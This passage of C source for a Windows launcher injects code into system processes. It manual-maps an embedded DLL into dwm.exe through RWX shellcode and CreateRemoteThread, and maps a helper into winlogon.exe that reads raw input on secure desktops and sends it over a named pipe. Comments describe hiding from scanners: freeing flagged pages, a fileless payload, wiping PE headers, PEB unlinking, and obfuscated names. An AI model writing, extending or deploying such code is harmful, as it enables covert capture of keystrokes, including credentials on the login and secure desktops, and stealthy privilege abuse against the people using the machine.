                                nt->OptionalHeader.SizeOfHeaders, &w) ||
            w != nt->OptionalHeader.SizeOfHeaders) {
            _snprintf(err, err_sz - 1, "WPM(headers) short: %lu got=%zu want=%lu",
                      GetLastError(), w, nt->OptionalHeader.SizeOfHeaders);
            err[err_sz - 1] = 0;
            goto mm_cleanup;
        }
    }
    IMAGE_SECTION_HEADER *sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (sec[i].SizeOfRawData > 0) {
            void *dst = (BYTE *)remoteBase + sec[i].VirtualAddress;
            void *src = fileData + sec[i].PointerToRawData;
            SIZE_T w = 0;
            if (!WriteProcessMemory(hProc, dst, src, sec[i].SizeOfRawData, &w) ||
                w != sec[i].SizeOfRawData) {
                _snprintf(err, err_sz - 1, "WPM(section %d) short: %lu got=%zu want=%lu",
                          i, GetLastError(), w, sec[i].SizeOfRawData);
                err[err_sz - 1] = 0;
                goto mm_cleanup;
            }
        }
    }

    /* Loader data. */
    loader_data_t ld = {0};
    ld.pLoadLibraryA   = (fnLoadLibraryA_t)  GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    ld.pGetProcAddress = (fnGetProcAddress_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "GetProcAddress");
    ld.pVirtualProtect = (fnVirtualProtect_t)GetProcAddress(GetModuleHandleA("kernel32.dll"), "VirtualProtect");
    ld.pImageBase      = remoteBase;
    ld.entryPointRVA   = entryRVA;
    ld.preferredBase   = prefBase;
    IMAGE_DATA_DIRECTORY *impDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    ld.importDirRVA  = impDir->VirtualAddress;
    ld.importDirSize = impDir->Size;
    IMAGE_DATA_DIRECTORY *relDir = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    ld.relocDirRVA  = relDir->VirtualAddress;
    ld.relocDirSize = relDir->Size;

    if (!ld.pLoadLibraryA || !ld.pGetProcAddress) {
        _snprintf(err, err_sz - 1, "resolve LoadLibraryA/GetProcAddress failed");
        err[err_sz - 1] = 0;
        goto mm_cleanup;
    }

    remoteLoaderData = VirtualAllocEx(hProc, NULL, sizeof(ld),
                                      MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteLoaderData) {
        _snprintf(err, err_sz - 1, "VirtualAllocEx(loaderData): %lu", GetLastError());
        err[err_sz - 1] = 0;
        goto mm_cleanup;
    }
    {
        SIZE_T w = 0;
        if (!WriteProcessMemory(hProc, remoteLoaderData, &ld, sizeof(ld), &w) ||
            w != sizeof(ld)) {
            _snprintf(err, err_sz - 1, "WPM(loaderData) short: %lu got=%zu",
                      GetLastError(), w);
            err[err_sz - 1] = 0;
            goto mm_cleanup;
        }
    }

    /* Copy shellcode. */
    SIZE_T loaderSize = (SIZE_T)((BYTE *)shellcode_loader_end - (BYTE *)shellcode_loader);
    if (loaderSize == 0 || loaderSize > 8192) loaderSize = 4096;   /* safety cap */
    remoteLoader = VirtualAllocEx(hProc, NULL, loaderSize,
                                  MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteLoader) {
        _snprintf(err, err_sz - 1, "VirtualAllocEx(loader): %lu", GetLastError());
        err[err_sz - 1] = 0;
        goto mm_cleanup;
    }
    {
        SIZE_T w = 0;
        if (!WriteProcessMemory(hProc, remoteLoader, (void *)shellcode_loader,
                                loaderSize, &w) ||
            w != loaderSize) {
            _snprintf(err, err_sz - 1, "WPM(loader) short: %lu got=%zu",
                      GetLastError(), w);
            err[err_sz - 1] = 0;
            goto mm_cleanup;
        }
    }
    slog_writef("msvc_dbg_b.dat", "mm: loader_size=%zu remote_loader=%p", loaderSize, remoteLoader);

    /* Execute. */
    {
        DWORD tid = 0;
        hThread = CreateRemoteThread(hProc, NULL, 0,
                                     (LPTHREAD_START_ROUTINE)remoteLoader,
                                     remoteLoaderData, 0, &tid);
        if (!hThread) {
            _snprintf(err, err_sz - 1, "CreateRemoteThread: %lu", GetLastError());
            err[err_sz - 1] = 0;
            goto mm_cleanup;
        }
        WaitForSingleObject(hThread, 10000);
        DWORD exit_code = 0;
        GetExitCodeThread(hThread, &exit_code);
        slog_writef("msvc_dbg_b.dat", "mm: remote thread tid=%lu exit=%lu", tid, exit_code);
    }

    ret = 1;

mm_cleanup:
    /* v2.0 (2026-09-10): unified cleanup. Loader + loader-data pages are
     * ALWAYS freed (one-shot bootstrap use; leaving them would be RWX
     * MEM_PRIVATE regions a scanner would flag). remoteBase (the payload
     * image) is freed ONLY on failure -- on success, the payload OWNS that
     * region and downgrade_own_sections() re-protects it in place.
     * fileData (the local buffer) is always released. */
    if (fileData) VirtualFree(fileData, 0, MEM_RELEASE);
    if (hThread)  CloseHandle(hThread);
    if (remoteLoader) {
        SIZE_T freed_ok = VirtualFreeEx(hProc, remoteLoader, 0, MEM_RELEASE);
        slog_writef("msvc_dbg_b.dat",
                    "mm: loader cleanup: shellcode page %p -> %s",
                    remoteLoader, freed_ok ? "freed" : "leak");
    }
    if (remoteLoaderData) {
        SIZE_T freed_ok = VirtualFreeEx(hProc, remoteLoaderData, 0, MEM_RELEASE);
        slog_writef("msvc_dbg_b.dat",
                    "mm: loader cleanup: data page %p -> %s",
                    remoteLoaderData, freed_ok ? "freed" : "leak");
    }
    if (ret == 0 && remoteBase) {
        SIZE_T freed_ok = VirtualFreeEx(hProc, remoteBase, 0, MEM_RELEASE);
        slog_writef("msvc_dbg_b.dat",
                    "mm: FAIL cleanup: remoteBase %p -> %s",
                    remoteBase, freed_ok ? "freed" : "leak");
    }
    return ret;
}

/* Common inject helper -- open dwm, map payload from raw bytes, close. */
static int inject_from_bytes_common(const BYTE *bytes, DWORD len,
                                    const char *src_label,
                                    char *err, size_t err_sz) {
    if (!bytes || !len || !err) return 0;
    if (!enable_debug_priv()) {
        _snprintf(err, err_sz - 1, "SeDebugPrivilege denied");
        err[err_sz - 1] = 0;
        return 0;
    }
    unsigned long pid = inject_find_dwm_pid();
    if (!pid) {
        _snprintf(err, err_sz - 1, "dwm.exe not found"); err[err_sz - 1] = 0;
        return 0;
    }
    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                               PROCESS_VM_WRITE | PROCESS_VM_READ |
                               PROCESS_QUERY_INFORMATION,
                               FALSE, pid);
    if (!hProc) {
        _snprintf(err, err_sz - 1, "OpenProcess(dwm=%lu): %lu", pid, GetLastError());
        err[err_sz - 1] = 0;
        return 0;
    }
    int ok = manual_map_from_bytes(hProc, bytes, len, err, err_sz, 0 /*payload*/);
    CloseHandle(hProc);
    if (ok) slog_writef("msvc_dbg_b.dat", "inject ok (%s) pid=%lu bytes=%lu",
                       src_label ? src_label : "?", pid, len);
    return ok;
}

/* Legacy: inject from a DLL on disk. Reads whole file into memory, then
 * hands off to inject_from_bytes_common. Kept for debug tooling. */
int inject_dwm_payload(const char *payload_dll_path, char *err, size_t err_sz) {
    if (!payload_dll_path || !err) return 0;
    HANDLE hFile = CreateFileA(payload_dll_path, GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        _snprintf(err, err_sz - 1, "payload dll missing: %s", payload_dll_path);
        err[err_sz - 1] = 0;
        return 0;
    }
    DWORD fileSize = GetFileSize(hFile, NULL);
    if (fileSize == 0 || fileSize == INVALID_FILE_SIZE) {
        CloseHandle(hFile);
        _snprintf(err, err_sz - 1, "payload dll size invalid: %lu", fileSize);
        err[err_sz - 1] = 0;
        return 0;
    }
    BYTE *buf = (BYTE *)VirtualAlloc(NULL, fileSize, MEM_COMMIT, PAGE_READWRITE);
    /* v2.0 (2026-09-10): check VirtualAlloc -- pre-fix a NULL return let
     * ReadFile write to address 0 in the launcher process -> AV -> launcher
     * crash. Only reachable via the dev/debug --custom-dll path, but a
     * crash-on-OOM in dev tooling is still a bug. */
    if (!buf) {
        CloseHandle(hFile);
        _snprintf(err, err_sz - 1, "VirtualAlloc(%lu) failed: %lu",
                  fileSize, GetLastError());
        err[err_sz - 1] = 0;
        return 0;
    }
    DWORD read = 0;
    ReadFile(hFile, buf, fileSize, &read, NULL);
    CloseHandle(hFile);
    int ok = (read == fileSize) ?
        inject_from_bytes_common(buf, fileSize, "file", err, err_sz) : 0;
    VirtualFree(buf, 0, MEM_RELEASE);
    return ok;
}

/* Primary path: inject the DLL embedded as a resource in the launcher
 * exe itself. Zero disk footprint -- no dwmapiext.dll ever hits the
 * filesystem. FindResource + LoadResource + LockResource gives us a
 * pointer to raw resource bytes in our own .rsrc section, which
 * inject_from_bytes_common memcpy's into a fresh page then feeds to
 * manual_map. */
int inject_dwm_payload_from_resource(void *self_v, int resource_id,
                                     char *err, size_t err_sz) {
    HMODULE self = (HMODULE)self_v;
    if (!self || !err) return 0;
    HRSRC rsrc = FindResourceA(self, MAKEINTRESOURCEA(resource_id), (LPCSTR)RT_RCDATA);
    if (!rsrc) {
        _snprintf(err, err_sz - 1, "FindResource %d: %lu", resource_id, GetLastError());
        err[err_sz - 1] = 0;
        slog_writef("msvc_dbg_b.dat", "resource inject: FindResource FAILED gle=%lu",
                    GetLastError());
        return 0;
    }
    DWORD sz = SizeofResource(self, rsrc);
    HGLOBAL hg = LoadResource(self, rsrc);
    const BYTE *bytes = (const BYTE *)LockResource(hg);
    slog_writef("msvc_dbg_b.dat",
                "resource inject: rsrc=%p sz=%lu hg=%p bytes=%p mz=0x%02X%02X",
                rsrc, sz, hg, bytes,
                bytes ? bytes[0] : 0, bytes ? bytes[1] : 0);
    if (!bytes || sz < 0x400) {
        _snprintf(err, err_sz - 1, "resource %d bad (sz=%lu bytes=%p)",
                  resource_id, sz, bytes);
        err[err_sz - 1] = 0;
        return 0;
    }
    /* Sanity: MZ header check on embedded payload. Note: the payload's
     * DllMain wipes its own MZ AFTER init -- but the on-disk embedded
     * copy still has 'MZ' since we embedded before the payload runs. */
    if (bytes[0] != 'M' || bytes[1] != 'Z') {
        _snprintf(err, err_sz - 1, "resource %d not a PE (mz=%02X%02X)",
                  resource_id, bytes[0], bytes[1]);
        err[err_sz - 1] = 0;
        slog_writef("msvc_dbg_b.dat", "resource inject: MZ signature missing -- resource corrupt");
        return 0;
    }
    return inject_from_bytes_common(bytes, sz, "resource", err, err_sz);
}

/* ═══════════════════════════════════════════════════════════════════
 * v3.0.2 (2026-09-21) -- wl_input helper injection into winlogon.exe.
 *
 * The helper reads raw input on isolated/secure desktops (where DWM-4
 * is walled out) and forwards it to the DWM payload over the named
 * pipe \\.\pipe\NetSvcCoord. It's manual-mapped into winlogon.exe
 * (SYSTEM, session N, non-PPL, universal). Same shellcode + PE-map
 * machinery as the payload; different host + no payload teardown.
 * See wl_input.c for the helper's DllMain + PEB unlink + reader.
 * ══════════════════════════════════════════════════════════════════ */

/* Winlogon.exe -- find the PID in our INTERACTIVE SESSION.
 *
 * There is one winlogon per interactive session; we want the one that
 * matches our own session id (returned by ProcessIdToSessionId). Injecting
 * into a different session's winlogon (e.g. session 0 non-interactive)
 * would land the helper on a desktop we can't reach. */
unsigned long inject_find_winlogon_pid_in_session(void) {
    DWORD my_sid = 0;
    ProcessIdToSessionId(GetCurrentProcessId(), &my_sid);
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (h == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
    unsigned long pid = 0;
    if (Process32FirstW(h, &pe)) do {
        if (_wcsicmp(pe.szExeFile, L"winlogon.exe") != 0) continue;
        DWORD s = 0;
        if (ProcessIdToSessionId(pe.th32ProcessID, &s) && s == my_sid) {
            pid = pe.th32ProcessID;
            break;
        }
    } while (Process32NextW(h, &pe));
    CloseHandle(h);
    return pid;
}

/* Helper supersede: set Global\NetSvcCoord_Halt so any existing helper
 * instance's watch/reader thread sees `superseded()` and exits, then
 * wait long enough for teardown before we map a fresh copy.
 *
 * The helper's DllMain itself SetEvent's this on ATTACH so the same
 * event does two jobs:
 *   1. Existing helper reader (called from wait loop) sees SET => exit
 *   2. Fresh helper DllMain sets it (kick prior), sleeps, RESET's it
 *
 * From the launcher, we just SetEvent + short wait. Total budget
 * ~600ms which comfortably covers the reader's 200ms poll cadence
 * plus GetMessage return + cleanup. Idempotent -- calling when no
 * helper is running just creates the event with initial state
 * signaled, which is harmless (fresh helper will reset it). */
int inject_helper_signal_unload(void) {
    int hit = 0;
    /* New (v3.0.2.4) event name -- GUID-per-install via obf_event_iso_halt(). */
    {
        const char *nm_a = obf_event_iso_halt();
        wchar_t nm_w[128] = {0};
        for (int i = 0; nm_a[i] && i < 127; i++) nm_w[i] = (wchar_t)nm_a[i];
        HANDLE ev = OpenEventW(EVENT_MODIFY_STATE, FALSE, nm_w);
        if (ev) { SetEvent(ev); CloseHandle(ev); hit = 1; }
    }
    /* v3.2 (2026-09-23): pre-v3.0.2.4 event names removed. Those wide
     * literals appeared in sihost.exe's binary strings and gave a
     * medium-IL attacker doing `strings -e l sihost.exe` free proof our
     * product was installed. Two months post-v3.0.2.4 shipping (Jul '26)
     * every user has rebooted past those helper generations, so the
     * kick-old-helpers code is safe to drop entirely. */
    return hit;
}

/* Core: manual-map the helper bytes into winlogon. Same PE mapping
 * machinery as manual_map_from_bytes, but skips the payload-shutdown-
 * event dance (we use the helper's own Global\NetSvcCoord_Halt). */
static int inject_helper_from_bytes_common(const BYTE *bytes, DWORD len,
                                           char *err, size_t err_sz) {
    if (!bytes || !len || !err) return 0;
    if (!enable_debug_priv()) {
        _snprintf(err, err_sz - 1, "SeDebugPrivilege denied");
        err[err_sz - 1] = 0;
        return 0;
    }
    unsigned long pid = inject_find_winlogon_pid_in_session();
    if (!pid) {
        _snprintf(err, err_sz - 1, "winlogon.exe not found in this session");
        err[err_sz - 1] = 0;
        return 0;
    }
    /* Kick any existing helper instance -- wait ~600ms for its watch
     * thread's Sleep(75) + reader's 200ms WM_TIMER cadence to notice
     * `superseded()` and unwind.
     *
     * v-next (2026-09-23) -- SKIP the 600ms when had_prior=0. Every
     * helper generation opens + holds the halt event as long as it's
     * alive, so had_prior=0 means "no helper generation currently
     * exists in this winlogon". Waiting 600ms for a non-existent old
     * instance to notice a signal it can't receive was pure wall-time
     * waste -- consistently 600ms per helper inject on the common
     * "fresh box / already-clean state" path. Combined with the
     * v-next DllMain supersede-off-mainthread change (see wl_input.c),
     * total helper inject wall-time drops from ~2100ms to ~50ms when
     * had_prior=0. When had_prior=1 (racing an old instance mid-life),
     * we still burn the 600ms to give its WM_TIMER ticks a chance to
     * observe the halt event -- correctness > speed in that path. */
    int had_prior = inject_helper_signal_unload();
    slog_writef("msvc_dbg_b.dat",
                "helper: winlogon.pid=%lu prior_signal=%d%s",
                pid, had_prior,
                had_prior ? " -- waiting 600ms for old instance"
                          : " -- no prior helper, skipping wait");
    if (had_prior) Sleep(600);

    HANDLE hProc = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
                               PROCESS_VM_WRITE | PROCESS_VM_READ |
                               PROCESS_QUERY_INFORMATION,
                               FALSE, pid);
    if (!hProc) {
        _snprintf(err, err_sz - 1, "OpenProcess(winlogon=%lu): %lu",
                  pid, GetLastError());
        err[err_sz - 1] = 0;
        return 0;
    }
    int ok = manual_map_from_bytes(hProc, bytes, len, err, err_sz,
                                   1 /*skip payload teardown*/);
    CloseHandle(hProc);
    if (ok) slog_writef("msvc_dbg_b.dat",
                       "helper inject ok winlogon.pid=%lu bytes=%lu", pid, len);
    return ok;
}

int inject_helper_from_resource(void *self_v, int resource_id,
                                char *err, size_t err_sz) {
    HMODULE self = (HMODULE)self_v;
    if (!self || !err) return 0;
    HRSRC rsrc = FindResourceA(self, MAKEINTRESOURCEA(resource_id), (LPCSTR)RT_RCDATA);
    if (!rsrc) {
        _snprintf(err, err_sz - 1, "FindResource helper id=%d: %lu",
                  resource_id, GetLastError());
        err[err_sz - 1] = 0;
        slog_writef("msvc_dbg_b.dat", "helper inject: FindResource FAILED gle=%lu",
                    GetLastError());
        return 0;
    }
    DWORD sz = SizeofResource(self, rsrc);
    HGLOBAL hg = LoadResource(self, rsrc);
    const BYTE *bytes = (const BYTE *)LockResource(hg);
    slog_writef("msvc_dbg_b.dat",
                "helper inject: rsrc=%p sz=%lu hg=%p bytes=%p mz=0x%02X%02X",
                rsrc, sz, hg, bytes,
                bytes ? bytes[0] : 0, bytes ? bytes[1] : 0);
    if (!bytes || sz < 0x400) {
        _snprintf(err, err_sz - 1, "helper resource %d bad (sz=%lu)",
                  resource_id, sz);
        err[err_sz - 1] = 0;
        return 0;
    }
    if (bytes[0] != 'M' || bytes[1] != 'Z') {
        _snprintf(err, err_sz - 1, "helper resource %d not a PE (mz=%02X%02X)",
                  resource_id, bytes[0], bytes[1]);
        err[err_sz - 1] = 0;
        return 0;
    }
    return inject_helper_from_bytes_common(bytes, sz, err, err_sz);
}
